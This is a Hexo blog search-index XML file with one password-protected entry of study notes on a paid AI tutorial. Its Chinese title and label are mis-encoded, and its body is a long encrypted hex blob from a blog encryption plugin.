<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>„ÄåÂ∫äÈïø‰∫∫Â∑•Êô∫ËÉΩÊïôÁ®ã„ÄçÂ≠¶‰π†Á¨îËÆ∞ 1.1~1.2</title>
      <link href="/tech/captainbed-s-ai-lessons-learning-notes-1/"/>
      <url>/tech/captainbed-s-ai-lessons-learning-notes-1/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Áî±‰∫éÂ∫äÈïøÁöÑÊïôÁ®ãÊòØÊî∂Ë¥πËØæÁ®ãÔºåÂõ†Ê≠§Êú¨Á¨îËÆ∞‰∏çÂÖ¨ÂºÄÔºå‰ªÖ‰æõËá™Â∑±Â§ç‰π†Êü•ÈòÖÁî®„ÄÇ</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a180c968f0794af80c949f54646fdfde6dc342f9b1db7a241016c4a366c5223d">30e1804eb8fdf5369ca7b036a4d003966067233618b263e2d81f65a7fd5d65a48f2f6169aa25d8c9dd64a7d14ba4813c883bbacde6e327ef4f175a9a237a5422380b3d924de7704c3e03eacd26193ffb794835e4d890f5370cb872356d04cd7ec2a2e8203b51618d8259e47d322e64aaa1836c4dc81c55d3afc8d4d64b95641e80a90c64f2fa08222635a502b2a84be13cc166f7c3c4c48f8642a02061644ce9f475eaaf2d8c87c2de37d1a6d3d8a0103c3446f13b1789e097d5412ddfa1231977556c6af60ac652e7281aa142eed2489e4b02b6eea4a9be1a1f6308a7beab38a1c15a3b77437c693504bb9da9e61d112492bea79274ce61428294a4ddd660d766ad132a609a9411e52f26b134443805cbf44b5e7d9b4df01859aff05a9568710a0532df77ea60ebbeef154d015bca9b4e6c1e065e828723dbec3cfe9ab50c1fcd1f2c678f6007d10b44ec870fa186f9e0ea7c9368c4aea676c88aa7f6e31257fd2717932df2eb5690a48cf47f360ac762ce467a491a7783bfb6a1b8b8042b8d46ffd8a7e0ee656a0e4b5c7ae56b282a4659f4aabf7ff7a344b6db9fdd68391a81ee3d737157efc27f68ccca88057e3fb240f6ad9c53b0d28d9970c4344918f0bb9a1451a0d49907336b8876873b83bee22b6560cb631ee61e0328e249dd682e6949f6512d8cb7eaf259961570ac2ecdd6fd98ab036085d897ae2b21b9627f6bfd502dc7eb211526dbd9edc53db4521a9d42af02145b3239e5f52d189a7b23059281ac34d1e572fbe1f01dad049026e6b99963791b2abc8c0086e74b6ef2fff94b18bfc37e483efc12492b5826ebd70f2123854c393c7e9cc2be5774c459a3fb10744552e385db489945b166a8fd1856be7975d94fdc51812a4155f99aa8e02be0443780e451be40d40df828bae724b563749fe881b413c4dfd4f5a6755590bb75034ed9f21e6a51d52476c8f5377136035cd3c23d5f955793ab402c6d66c0b5ba6f68b7592744ea9c925644fcc7bd465361a9a6e1e265daaea5e3b6d37275f68cdd57a9812070ed27a68a8919a998e2edaefeac04c2ada71d0f6c5f534722357d6005ef730d31da79404c46db38f42d3a2701a356a179b7017a27be0c95267018bafc717bd5da2397e879737bb9235595e060482753d5e45a0b9c88bf441d9834161e51a31b3eb1c9651dd6da9d5b23281013f3bb1f18c437cc47f369bb7e351afaa99c83b43300005134d7e090ceff147644cfd7ce714e302f8279f7012137418efd814a080cfa24a8962c6ec7f4c25aada2648df6bfda256e02faecae23defd30a00d3acf197394098e1d7bf63f08b9967afe64ef3f2fea5905fbf30b418424d2bbabcc977ab5996e9710d8a5e48e517ea180d384c52a4b525fdc3e0f8166c3a10d9bf02aa8680f088b18a73a757802213f3404a20457c7f4a432095bcebc7434641171665d7ab990d027fc233d7e6979adb5220330ad1bf25cde64f8ad451bda563b56dfaa23f2402243fe02452da58a88cf6bc75d2712e552ce96e3667be33dbcd45ede40de43b6c6d8d18dd0a731ad516de9e109c54134cad255d7063b5881b63a17f02edf19ac6311c29f2c0e32f95a627306c000b4507a825a66cf2967397040517628748a19c4ee3d41afbc1282fedec226f301f66256ee03d11fdaea42b53a14dcd64692219ad70782e2c048cce87c8ef741c2ead6109c1a6f546315cb8d0d8565f2dcc822b71736bb952bb4137e9df19f7199096535de7a3e5e5e8246854c1e3b08e61d002c0aa305e5ce7c44c53ef4d91bc0a61d3e4ed7504d139c17f3836824d499fae74246a9986290a9393f27e325e13516dc03f0630805c8bb3f1bb73eeaba35658feebcf76cb97353119668009522e7a18457c80ac0e257bdeea5a9c24ec68f2d27c4d0d305ea7bad96cdad83d5da036f27c30fde05a242b406ca5093815981a0c1f12f4ea7c364ee287305e2463374e2b907db0c2102937a1200ea382344beb058a58c027bea101efbcf2d7a1289d6db0454ca5b0e51662107da34ac3792d9f699cc54a8d7c1d013d092b16ba5b9b1f0452baf71b446c71e6e6c26fa03ada4dbb27c3f65e2621619fd04a0b4a460927e6e4daf566dbe3bd7bf934c2ed7c74fc4854602043363834dcdebeea9f4b05aabd1a28b0426674785d8feea2ec8129c53e242a141d807a9e96203cd7dab5e2f669be089747ed3768845a493c5fee498069e9a88822f5ad64560449171e9251a3a73f54dba96b295a81d3d7fe440bb5adb0a7a37998f37cad16f295e2c34fb9f68112cce5a1c5aea73d85e15620b8139553eb69056e37a0809a90c3b73b1df2bf7a6d653b2ab97e9e0eb868a90bb4e5119e02cd8407e5d2e3bf8ca3ab79c67cab9c7e90989353cb8896ced9c921366103f34109a98198cfe49705f2c82bfd67615ec5399d3ecb41e8a57cb658432040568c5acdc49b46a0585b20458540ea08c4e3e331e540d6e0b7539dea81320c4b4044ef1a871282142db3d87d6abd4b239a470e284b5bd1cc15b33bedd287afaafb4bb8243b1f7031c4f72d7c1f8557cf68ef5f4ee45e2bebbc933873556379832319a4d2eba44c58c7ef1742610edcaf64c082df6feed474d481d14948193ade707502496ee6c54a98de5414357abbab320a03cd370cd0a81af2675d4e91fa0fe89c023c14a91e1021320a6837677ff53e9050bb9a779474fa7c8dfd42d83854b2d13ebc0302928d4263fdb669f758729340eb27c84dcc0897830fb536b991aa2913059260ad602aba3a6642972edd7fd1399cc300838deb5e03658d37952fe060d52e518137614d34aa6f0026eb4c1ff3e9939cb55a436687163ad0d877a55b7bc6572b43d8b51668012c69b565ee12adc1053abdf38ea78cf6c2518427917e0f430f799a42af38f7749229f3e17bbe18dad136a23adec750045da8ebcdf1ff024f250876421b1d930b2c221e553e7a232b251f3d120a2ee5c89340da9421941bd8fdf4ee253fd5029d4770ba1de2dfd8a7e4b18d7d74c0e3eba9b0d31504d27f8d2a0d5be778a7cf886e7f61cae75d5c61fbea911dfac72e6f97e6470011eaca2d5f2aa6a91ac10e382cbff85ca58ad27b1cd317d0bc931ac8c0466505bb1a90bd6937ae8c08f94e3a454ad2510f675d3c251df438b118c7ee3af603458e7da637b11e02525ef630068ae5f2eff0e8b9049d46fd90b6b779b8109af424b29a93531970901ecdc2a955f3774b5e0c037e4f70c89f0010fd5a0e32e012c071dbb29c35b136b1dba65fb3b4209ec0c704f2589245ca8324752e0899701f65ae3cb1c30652b453e2410b2642eda808eeeef3efa7afb983ac945c0e2d27d2c4d09686a4b00b90521d58ee31a326872103eb238c3ba9ad9cb658be4f99111c64b54f9177dff9284af81d63380b69abcad72aa7be1f9205b17ba0f32befb5b729a88573592c04e3f2ea60eb41b3c7aa52ac21cbd763acba7b17ce0197afbc5d2039fd9aaaf1884fc55e29591bfa6b677870ed767835b0d274cef4893f3b6cf39ef5ac06201ca57f820cd435b2c228c4657db5163a0e4ea4e5300039ba02299b731c053bdcfcdaf78f87718b8e663ef90dc0b8a1d6f1781d0fbf4541392d5fcdacaf835053e166158cbb40febd2e6ba174084934dadd6b4fc08e9d73d30ec1e13b0bfc4c064eb21dd6f191fa434974b933227793fb91d9f48d06d64bee83452c4e9d5ebe0d4ee5468f47ba48fdca62ced0ffd39454d2d1d6e2bba3ae218ba1a8a59e4042bbae12931e4b210d786e85296880d0a3d928d31a9256bee5173687971a1a3c1f0f3137628ecd4ddb5e3b0241747d95f427333185358e0beb73966ef289a0c31c917b91dfe73ceb49caf9d08baefb9f6293137a26a08534a2b39089fcf7f03bde8bfd19830050f38293fe58bbbcce6c3d239935c0d20e369121116d977c8db8e0cf790f03e2ad4313be383e7e1f085f91d361438acac9e5169506f9bb016d02f45926e684afc777d4dd3746ff4d2636e6e6350c2186a069a16003dee74d4ff267bdee18961652f958887d4fad9978712f02324f3a193de3478c21b5414288db7964ea2218d85f9a5fbc06e97c5ee19b7e6f42264ac65d5d9cacd59812ad7de27688cbf59e0d16058c8486f9c9cf653b64af3b26e7079dcc80a0e74031d14d055476494b96433a6604ae36bfb5828424e8c07af2f15b5fe6928ced9df80ef54034ed3f7cbec1ff4bbcb203588852015eda9537cee27a5378539c34ef859606cfa073103f9d877275822366c57449c84206076b162db01840dbb8fd8384a2225cfdda436ed2bbc6a4519d02b77458718fdda5cfa3770c22552ed91320c513203db52b35a5bc651325a8d7b96c44c38fe5db8185076413b537dc21f9c59d1f2888883f8b568f4cc2cb5cc8404e8fa48750c2abc2abfcf2c2f4f2b390e883a6eef10395400375e5e799bd1205d22a24b6b9e354898b2463ed4bf25ec42ea47a27997fc016799e9a783d95b907da69495dee5aadf50d330e146f250028bd6a0de3a4acbe7a6e41725e873e7ce0708b53d3e55b4c04c6e330d0c61b8e3a49fad18a42614714beb82b732c7761fd21ec1ca7fb03e1035e3d7f6157341f8c03fd39fbf631c191786fd0a337751f3685261bc3b232ba5ad7b1b8ad2387144328af0b81bc50cb47aa065a4286825ec60bd45188ad5e1ec1c8dbc5e55763d0ac286cb9c6d43997f5f78b14817a1b268f0a17cec521cba8c89baf37e100d17c858439db86e7d0f9e09da5582093343682ef6846c663509f56b144d5004ada3602e2ca607ef9c4f2b9cece55addfd09e41ed1a1bd95eee9751388785e4c6f65516c32f51f6508b97278bf8cb483a063604a7bce4733cbcacf8821adcab6f0d6ad30c064e7086838b378f92fa191c95d80399f4e728c4e06fce441a012f9513710fe605d410704ad8dfff57951206e16c6d5097daf79da9e27938a9263189828f4242d3f677dd86b53be33dd287359c6a6d62be7a5292ae63721ccd4c759fddbb2d594d409d256ad5914698bfcfbf4329b15e434716695579335fcb9b7cea6100c472eb420d8e088c1bb73a6339dacbf46a7748f3d031cf10bcdd231ba35ef5a86fcd81fb7e709bda262c4c932c4e1dec4d107ca2822d6440a9f5367d64e26ec31da90ee66b3667db8fa3f1888d13c944607f107b77e3105b4af71151e792e98f8f04a6a432277b70f787f9b25dc9c1f71a09f373b1770d192c935daab613c7d44caed2280cee226f0b2c916c43cd4b8745be5e9b794b631d0d6ed104b76eaa35d1e0b26539b4e3ed4d5c7364c456c087a534234ade014293ae40a5bd0de024aed51f0013b37f8e05cbd02afde3fb3ae717ded5b09b96c639c320e101d45fa9ee2d18bfb4b234b94355f268d603b1b15e714dbcf3755c4f27cab889ff3d889d2386b8830776c294df84c31b02d90e32ef966d825f4a4c11a97d8d2d3fc298c5baa52473a1b2921ef706e8865dc04c477b78fb92d20a0e096dfd90b7cf90acdad1e84f0475917167d28ad48dfc7de81fa40a87e94b6d61807a428dcfb962dace02dcd7993a47a9359b0b4db9cb35254189aa24bd4990db9ea3dd7fb66acda6bbc1bb2d716026fffcf04a752566ade0ab9ea9dd32235ead2d8ab70b65072544ccf17d8579130966ba2cd50e7d64fd63899135a0f21acbc778e1d6ff26ffa84105213a388c43f1b5b0cc76e8cff365e3b418fd5c7378aca2afb13a6130d3dba2661079ae9a273e6517fb28aee5fd4541c531487ccb0d1aa0a55ac36d99a32d89d75cf289aeb88b86a24338cc042ecb98b7c3705854f3b67cfa754ac2ff8baa9e061e7b5fc5f00eac04d43cc2825cdf6f0e600c0de92e0613b68b7b79e1835d255815dc46d2dc3301aa326085aa25b18baa3590e2870c53757232de62a4d4149a7fc82c5b9d1d1861315d7ac6ebdb0ce75287ad8443bebb8d719215cd28edf538f4193a8f521cc6175e5712eb2be59a0b9bc7bb683c02d5d0afe89eac60b0e056fa976716c3afb2c844e02d6db3edd1bdb593b907d8f32a8e971d10d5a9146a187b6d51e14b727a16dcfbafdfc0813cbd5e6c26bfffcfb073112b0fa0f38c5c50f46121a3dc53faa49a479201ec1b87b79ee8ac34a0e7c6298e920d80ae6da0eabffd5ce92ddfc03476869b718f3b1ca9593b62c7f415b7232afca2b84026ae414c4f8bb0f55a4404ddc4d45b4bcc6ca0951007529d58122d41c53ef87ec8a77247c6aa9d8154caef756eeea17fc10dcddd26df2fe6c36000326770952cf131e472b940719b85c927c61a7f6cc87a0fd58657a57c821eca310aab382631dab12cae0dd57bc7c43d719822a53af9d41fe9bee487a85fb65f0986ec4b918e996e3b433cff39b988f3a7a3502a0d6ace97a758b22ebaebd0a9f235382cde31eb3833bd44832ed789a4f0d2954cae6437eba581869cdb2c11b272ddc8a65226474e531a8c0df82d12993abd4ceae5522b2d20f93c795db84ce20b1d905ae500123fb2d8e9fa3e5819a70accdb2fdd4dc11b88da27ad66cd907d1271c18c7a98c4151cba715c4f7af9416eb689a8a024c7a747dbddbccdbb81621baa32e432a144983e9ae1a9c7b136fbc9cf0d373f20e2bb37218036bd2144943262c9c76262fac21ae942a96674d5413ea29ce35fd2d38d8314ce9af42fcdf6b249e535289a0d24f31727617fd298e1591600b2f9ab8381729bbe11af4bb20b74091b064d9e7f71d179c93a514fc6eed3b6715f45bc5d0e2f8b36f653e3b59689149bf4907a36e67ac7ec12d5416e577c064e741d5a92468ca9600939a113589e74886973bd560b6b3a7a3f9f97c65f9955fed18ac5d731aff602aaea5eba19f61cff596b2ced3f9b03cddc419ff4dd8fb06b32ccc150f6149f5005d6ad0036995a127aee08b9a1b44c998b6778540dd1127ffeadcea346748f38e71d515ab1a404aca3551b10b345fb389fbcd47a8010aca7d5da88447c5dc33167ba51a28237059694c6fa5d8ffafdbb91462c5f74e9edba4f6a2cda616fac2ec5b90ea29905dbe7f0c1f1320616a09289236c1e44b831f12778b86981b56d0e27528b9be3e56438e47ef0de202ea16e2c755a563941e2be8bd79a277449bb67966be1002f8186fface8d4b4fbfbe0040b106057928c2a34490000c585f2e48ddf07532c09e8d848f4435ab771a0b594854cd9acd220ae0cadaf05c245587c41526a4236450664ac99402bf5e953ec6bc0c56e62980021e714e25487b0e6658a6528a345d8a4e325d21e7aae291083e70aaadea9dd7ef71dbe2a7c3b088c6a60e78f30b343f38b54273da93ceb3ce126a18242ed5513aff63830b5f551b679d20062b82f63121d422338df930b7da8f3f9025e558aa70c39890ac5c31ac648fbbf1fba35f4a604408f83a66f992530c7f60a1fe79a205b1423d6db7231dae500d53117c3ce7a8ad9f466eba057bd8a9404e4b6fa24970faaef00fc540745fdb6358052ebaf0f59ebee009c29ab8173c46b2b68334de5fc4aeef18175c80b5a7e63c5069ff2db5c81ac1636ffd2f60ae27b5075f6a96c96c0033aeac40b53a6c9d2fcb1776bbc5e12ea0ddcba5bc6b72aa69f87bc8fe912c4ee3ad99d455f3c793b6cc0fd8aef59569c4349a1dfbc3dd293a1d6ebd2e27a079468cdc8f31870a9b5ac7dba9e6b50099ccc0fafb18379d2871b1aa36a6f11eca75309d3612d6395b3518c10820dd332e6b9443d0e39d4a85dffce61fd754ffb61846eb9720b69178166626cd1bdb029dc41ce93e153ab813e8aba20cc1e106f7654ba2b3457d3508773cace2b89079d6eeb72a6c54fe9b1bb1848aee44b18369ea971e6e6cc74647342d01ac13cfb4afe4b52c3fef4e749ae847cd5c211e8ccf12aed0023d07303ae36904b63f5b6fc02c4d097375aaa2e16505f2e197368f4dd69bdc0a147068a51c4d68bb9f89f947b61a28fc67724c43968b40be3bf4042287ddb5a716b5d21402b469c7531df894adbb26cca02068bacb53b475f8731d3b3833a016202553d6c357ec111e5f7256c6f620c48824792165bb9fd93b7bcdf73b1f1f286a2591f72216e225b36cea900398f7190baca03679638740c01404c5d0cedb53c4a32bacceaffb8e4e45be5aa322fc602b03ca437853c0b6572170bcb2d4563f24c5154686ac74d136ee3942e24da32099a3a71b10d66f3787b96010ebe003e284577673ff508a775a140d0643188e9d9bf431eadfb493b601b51a4b186c2ded6d3b8ffb0ebbaf28c120a69c43af15be5d7cfefdfa50fff6835c025fb8a17df274ac93e1141295654c31e834dd4706262b0552a84482ddbd04f15c04cf4753f5560977bd87c95ded051db483a6aa1af8af236932730a1ce2515b9166ca92d21cab7b2aede92ac6512bf6c9b638f2b73ff81ddabcc5f512246d4768df58a5608fa1078cb46959e2d53b996d51d31d59ab73d3e81447ae6213f0c671a22131388233912096330a9ac3305d1830de1a9f8994d1fcf4833fcc3a1c761808966e1b7f65b2ae7abb6451c96d797d8e9f54c570fedbbeed6a5730b1abd998c877479ea9baec518504d2971c0a41d2c8ea554e0b67e273ae28bc3d1a41f9d3cd700a20a231cedf7cbec3671a4a4fd83d349dd80d40330529659089a1f613ef438d2ce5a39e92aebe7e9efe602ee542856501e90088852bc0cc0ead6bebf9c464992bf10e08f3d21fa3c919ade2f180ac3ec18a502c6d34300325a50c2df1b34499f1282df26b3e09287451886ab71cbcd325784c10c78f19ecf9fb2349a00b0356353e4556bc60b4eec34eb401dcff4390bebb687bd74f4a7998ae10452f2d38a0c3ec8cfe71446c157e2668f604af8fc13878d7a123883bb9f2d2fc55c365bd6af0321362bb9201ce8fb9e5b8041731355faba51438f333c8f4593f9d31452c361f137fd0801b13b5102506d2c7762353a4ee9d211208fea8fad9a9c8e176e9157d8f7b04cff97319ad7f903f298f498c50b0951195cd2fca90db146c3b945cb7900fb45d7639f493a9f4cc432f43e27415796338bbbfe57cbbe0943a12e71da4112f450a390d5d94d1f3ba2dd5c1f1c8796514c2bfdf32c31af497ae93b6445a04dd41d30f5f369f4ae9521f2ae9e47eb3664b6db2f00a98edb1734302cade283ab9ced2abbb48f05f85c4fd8284cd07973f53a09bd2c6a9706e9e28ca8df126d367b4a3fe786b8993965f1cbeff63222e9edf67968ae0c87fa809834e307dbaf5ff422956d21ecfd737174e1a2e5577a8eb2cc0ec031996100997223cdd95c69be28aa847402d2d7c0a234231fe4f681e9f9ebc60c80d5fc0b024201b0b6493115960a53d5a664b684e7a77ad1f5605702a1ccdb73a5fce246a5715a8c220e1a0eb292a41d9dc6e3fdbcb1fb93077d1e5e62e881e6558f36545314b14dfcef89c9120516d201800bb64cc3edf89aae7222e2abc900337f2136eae11a302567bd2958fcbef2bc106c154c29d4b4e9c412af116b1963a80ee998e4eb2b9355e80a8c94a20ee6ac0c6d3f79edb8a2de2e122a3c205bcde330af6e8f23616c18fd64d5dc5de35ce427fedbd6d31bd9e026e3537538d4ba774e8a9379dd34a56eb6bd04548d51fd8a0623e7ccc1c54fc458dec27479cf722a9ead2bf257f935c4bbcdef71e50bdd27e045e31370c4f2d2998a8f0bd95c3a8a0e13cb766809c2b2e00330600e2bf71fff1cb372cf4f894c1718c58cd51690af014c28b7c2fefb50e230c00e168379af88406e429f534bf0ee4bbf6d34c9991bfe53963e6b98d418f75fba61817e6d7fb35f420226dce3aed818892cb4747cbf58628ef62b7ddd5b2977a76c900eff585d0650b33c7fb999991c6f8c95e49b9acfb14b4467ef33020c1886f634e55cc2f5d42be4db77045378be97fa9033d215271fcb47a32adad5fe90787109d526f26fda932df67ade322c9ccefc50be88d0fc77ea295db4cacc9c1b2641784eb85d16774f83d478000f6532ea3b0a4c7787c745896e8f7d41d78e10820b6eeaa992b524bf178b6fed6fc3975890753188c388a8f0a328bcf9806f2efd6898b217c90c527e183de6311417a365ad3946ea96575dbe52c12d2ba25fea0087ff6f1bb01eb991278402735aa37175bcb80560518348d970604fb32c3afeadb35a7f29486ebf7067f050f51340d62a81742d1d1ad971475f55c475ed7f4501f87722c1b9f0a4a86d43e29c422180bb5fe639ddd0af69d8df96c6abcaab5e2c65bedcd565a92beaf4e7fcd723138eddaefd482cd6f193dec97f819b6592107c1518bc9dbf81b0b4ff02b46fc5b68672535c1d4965f393030bd2c9b6eeb58d5cffa78b06c5082a9ffe50b64c9879f7e1c4e9457c55231d45a6f11963266fd3392d7540c320a77f8e059bf2e12e02916e14fcbc3886a917d0f321ce489fbc7ff85318eda90e64ba2aadd1ce42bd9e7c31dbf6a21223e547ea719d5630cb29ac671ea1841fe5f90298067895a121ba373d90b6a4819c97e2868119b12b323a8f6f365eed71623cea49ef9acfe443bcd5f2458d10a433414df572a519f868b5d96c76e8fbb357f2508bf1bb138e073586c6514d45ba681ab481f5a1828c53dbccfd1c96b8610f6f49eae993cd5ee013479e47a90594f78bf1a6f6ffd45be3f22a22a51918784b1e374397d5b5d884f1f09cbf701dd767f7c2d3caf10986d71f4a1f84208d10ee93018f18ae97ed01e6ca5475c2ffe8ff4288404fa4a1f92ac846d04024c839c316b568bce54295a0771d7c4386fde763a3f26a2d6ee52658fe38ef78e6206978a4d60f003849716588d2a121368c2ebe4164d025dd8d5961a3d2a078c9af42fcc8472d2794f63ca67ede6f04e58f678cfe9f6b15bb1dd7b52589c732d3800f797574d06a9ba2049cb99b23b08c40d1fa92c048bb6573d28ce6db712c7d9f997600490b8b9c5691cabdd2094484846ddc6d5df388faf807c9861683a459cdb6496bc6986a1d96f12854af5b83388a113f6b22fc739c57cc8569ce3553a5f033e55f9b27a27cc78e76790ba6b027b27cd56481c53f7cf964f47d4b34018b142b874338281fb4105b292b2168fdbc64621c26f1e20ab6430cd594f2c04327c8fc2c9764edd21421937f206b18deed0bd87a9bdc2f864d7a95b248cdb9ccc28771847188ad677d1be811ffcb26fc618c4b5d7eb5b503acf13f26227700fa0f5a50c85ffc2e52dad10adac0a33e8fbfd2f11d97ccab10792c60e8c8d895dd63fcc0e039de14a108f3e50e90d5499917ae190412113261c720c8b98b85c9d60280bc44c50d04f6c1ab3215b79a719fc48e7ee171fa93be1f877d2d9e563cc3aea70cc8ee6496b7e3755321e6b9ee3376bdd429174e6b06f855d0b7cd0925a702753ac4053f9a6b5ad51239f0e40f67e796529be53d10a4556319d8d772999a8642db47e69547583ed6818ee1239745549d6baf53bf64e866cdf6b7c764924ba5028b33ceb26abdb73a3096dba4f925cc5d59e92af8e2d8c598f0962eb153bb01753f22c6206059193cd5a1163e4a2e2d6364925a94edf5993a54eb95020771903f61c4a62bcca1e0d7f4d1c5acc0422a56cb34512f5833ad91187fc71f962ae1cbc3c9c758ec4a24e46f0968b2b6953f6c4658ab6d586a45f1ffa40c27eb54fe2e821b61cfed74ee0a0339b2d52bbd2fb2a1bb6abce15cecd4fd38c8e918e716d9bf58b8e9bd08a9903ae974a92558db2c5225d480590e595bdccd614f68474e62981de5f6e51c9a61480e7e3426da384bf6cb6b5d6a2d4ad0ddcb99f1f7af2c731064a2d2a2b40841ebcdf68f9ddb070c710e588ad7b48b085b960fff42bc1714ac29d95b96332845e64b7fdc882a3cd0f2b58ca511def1e0468cd41c67a5435a23d409222322cb7cb94a3a089bb582d30cf549d103453042dade0be65369c6ac45a608062bb428aec0c505dd537a4aab1b3e7694381cc7eddb028bb9c6d24fa1ce5701a3ea106654ac5c4346f1e3d5ee79ea3f972b27c7e115594d0414d6fb2997e41603dc1f46213ea0c5f4fd8686d41fa285ae98faaac9b22b3b91c489509a2c3a9cbc0a93da7924d54f8760db5267482d1aee28ea35dd4af4098ee76b77d87dbc880fb2e657d460a53bd1e473566605ff9b687040bfbd1435abd7a788653dd1a8543af6c365a2e23dbf7d5f07d8d44e88b2cc393fc2f730fe081c72728e438be7a47ae809a96758151ff643e850c336c2c005308c19ec5909982be857811d0856ff8452cf0117d7e29104e2aedabb1583ae273de5f20a42b4d9b4fce5519c70529c05e845303bfc17f7db10436a8363cd0c093896f290f57b24d47c2055a71dc8d67f7581d0d54298598d1259688b994899be3ca24197d0623f60af1278c0c35b64befed49f69fd4e395adc28278c953f58b8a5e6beced49bff4d404dfaacc12e965ffb6573f7862b991d067601a82e3b6034fb56e4370d0f95fccd9fb6b982c6f6f7e295b4aadeb74bd7ca23072dab038efd19f39c753759117c8636978b61bc04f4cef0f7df90e9bde9d027ea2c37d315ff883255e9b73c4b33be3e84dcccaca862d743a5af242ab43a42ac52687fba14b309d644b6de4e965e92dc54ee82d4f92ce1d2ac1ffe920412fb44ac0b3c5bfdf2223d81f9027efdb9d6f1789a4bd076b0d2ca996f87999cf76a6cf79e3687106fb4d0ca7d17eba5a6f83ec183a406e6c61aa8cb8a3e9f4adc0b9eb50214e72bda6934e2fd4b419759aa871d1a617215b75bdaa44610ba33fae67addc851938e5dff54242a6d91a0fa850bc766a5fd9aa23316433a52c404f6d18d94431a91cbee124541350a58cea3da8d25af14f4fb20b5403f6584504c5bb0e9c9342ecee8e19ea5defcf60fd6246dbb2b117f1d85d57aefdccfcf5652ece45cbe8b67b1c87956845dadbd6ba76c9fe7d4044af465fda0684737fd847ad886ec27f770aa342937df04d06b65246e7d98844c489c19d8fe7050b47c98dbd5e5d7d31c8c67d1695dc46d21af4be4973a1568f184f2eb6879ebd491f8fdfceacdba9b65ee3c43f999fd27f3b9a82095f1c3591bb2094785cb51d9a65fc204fe4532506977b7ebdb092dc64c4d1625bf4aa91bace291a0e1477fc035ad4df00f189a057911cd4872b70b3544688da86e4ae06812b3cfe133e2fe67238fb6dafbb7776a280c12122a59e83ee6496f0574a43255c80172f0c0dd417bcd9a16683ced7aec657474f7d741eed3ba499e6211fae8511075bf57a5efe48b455526b85537c1cf3c806e2fa4077be2c6163a22a5d8c5c8febe0301de3cdfb62671e3d2a7da78b92402d57dedc43704043438ed61de9a8bbdb6452e874f750159c7f4c2060093a3dabcd20868ef2d93a5b27002415f21e7a88dfb112fdcb2ce69abf0508044acba3c2c7b139f27e22d510fb33c924809797f0bbb81ed7f76b97b015d775d4926b636e2d94c8d6c971fc1abb356c1f0605ec3690c7cf8c8a50f384b78a2019563f01dfbce1462d69b7c9a720705ebeb77db9308b594f70344c610f5ad03bafa6396495f7458983a839584dc544538a1741ad9186f510c7d1c9e082e7d3ed61882fdffa35a4ff41f7108bb6554bd54455f01b016e89a17e82043844bee2f6c915523dd90b019982dd6101d4adf1fa3b54bf13f587a3e0b6d222b10afaa976982fe0cd5de203637a4f7b6c9f64592daaf586ec0eb83b35cbf156882c1d37740f4bd0798641db6d48768cd1bba811f6c63fb8c25c97939030268b82caf661ea1af562fdbfed9ea020ffd629034bef6950c4df24901e4690dcbb7c4bbfcf2def655a845101d9554c194321d3ab6903d5e007d9e7c86c36f0312f686d58360752fd5035b7ce1243ca791e70d1f4bca89efe854b59271fe2581c003197b11f062766975dcfbb544f3db74f7b0fb97bc168d28ee976aee2511303f9ad07cd3aab90aae7b233c5b8c6b9bbf0b34443681701e88346542caae7717259fd51d562f36a8ce504b3b59a08e6f7ed96d5b07ff2380f471b37259eac534e8123b954d1b0e14286e1571addb26fef1835e6f81ed7a635c280999ce7fdf70d7066d953fb674e9ad078f59fe9ad6e549513681a4506f45527b9b3dd5d15aff1c0970f9bad750e00a6f20fd599602c69f635a88a2d1e914e9fbcc23dce00cf5ef15a3ddd48a3261278a6040928b70db75b4d711468297ff428fcdbff59204eeb8e0c8d21a6e5dafe99510e089ec58f41dcacebdb65fc31dd831c74db12c1c7adaae71194fef2bbfa08a2ac4b0e995543f333c2631469a004e0e0f394db2c048a519f6674109028f67952c80fe3f7477d0235f8760b45d246f95b02edf89c032ae5865d1ccd86af95aa50291784da4622dae0e6f42b7b2bf0b22a7627b1dc6eeef05bb8dd588595773d14cfc36e8f7ca1b3df124d3ec6054e29d95c2ced8aeaa7c3aa1b891265d4c5de7d7cd3b89ad5291a53d245e337ad10e10847ce1fc1c5a38c3baf31f0ffee00b5783bedbfd00d7c369b46429163890930515be088ea9dc8aac7ed1f2a42c6f9b0516413f1f26899b81c6a3396d4b89fc862d8435e8278d2f35a57c33ac70ddea73da0055d0c27d4d5b897afafbdc9bc13406becb86af99a92b1d136669944bdb6400b4c9cb05da8a91f213cfc4f016b2fa8db338cb161cfc510ddefc8260fac685429bf6eb5a73990167f2b748c65eefd3132091516f4c0dcd455f84c1866fdd68df12ceabdaed57225ca4b9bf4bacdce1fa77051b0fdca82b1bb842f7ff2bc1ed95784f1a44efd4df54750f3eb097e66156d32528b18d8c24d0f1489fa99e028992468b080d9bdb2e429a48095db7689ce856346b340973c7a3d6a4cf23848409af07c706f5da47194fe74dd85019041aa17abe5bd83dbb00e17b6c5ab0ba02294947c43ef415788a04cf600de489fc040591d00f43c588ed88bbde6356881a881f384d03b5d71b86987d6df7dd8f999438a12708d393f2e1244593dd5b3346ec827cef6ef1d2cee99cd0e3a896cda7f241a257989f9d686a62b76841e15b1bdcfda89b5e639b9a11c0205b9990935f382dac038f701221d5f7c26342b8e1d752bbec6ed023c03065eeb209443454001019f3d2cb23ee648e7b721394dc423fd722180b8c6512054076c55adf82b900b7a663a3ff8fc717070d2c48eefe6199c0506bb761c4af99ab8b5b3dc4d598ca02af73dc36e9b59d5bd2e221015aaefeb9eeeb3d6328f4a9c31a0d7fd27376e33a7542a0e57bb90b42a45770f7c34644d5f4d4e793ea02b77e5dc37eb167dbcd94ecd53655b201b3db3885125ba491c301f037707b310a9f8d770beabe87dff6b8b5093db318b2e88b0f17ca21df4934f0f7389d7cbd8d54bce2397240ca54322ce05af37c38f007f3c8d2a1492f2e231550a90141aab398882ed5c63fdece395b36c557edb77a1da307bf7e8251d2844895cd9decd9a1bc1e9694e928e1c97b5c58e682f0d476bd08a42c8dedbc5d7222b982e83e6060315ef131680c7043e40283c532e1de2155365cd8683c90eebed279a9d5b8ba02d4ae103efc3bd10b6ed6e4ca14c72bc37f6290d32162ae6d5ab15d80e415883fb1129c80659cfd155b6d79eb43a2c34ece1b37eed8cfba08c1ed742dc8427e74618a9205ac6ea5f862663ab179b9db7291c9d95959110233d34f088e83b59b310300ff5d3